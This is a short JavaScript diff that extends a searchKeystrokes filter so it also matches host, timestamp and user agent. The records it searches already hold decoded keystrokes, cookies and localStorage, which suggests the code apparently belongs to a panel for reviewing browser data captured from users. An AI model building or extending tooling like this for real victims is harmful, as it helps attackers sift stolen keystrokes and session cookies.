@@ -45,6 +45,9 @@ const searchKeystrokes = (logs, searchTerm) =>
   logs.filter(
     log =>
       [
+        log.host,
+        moment(log.created_at).format('MMM DD, YYYY hh:mm a'),
+        log.user_agent,
         JSON.parse(atob(log.keystrokes)).join(''),
         atob(log.cookies),
         atob(log.local_storage),
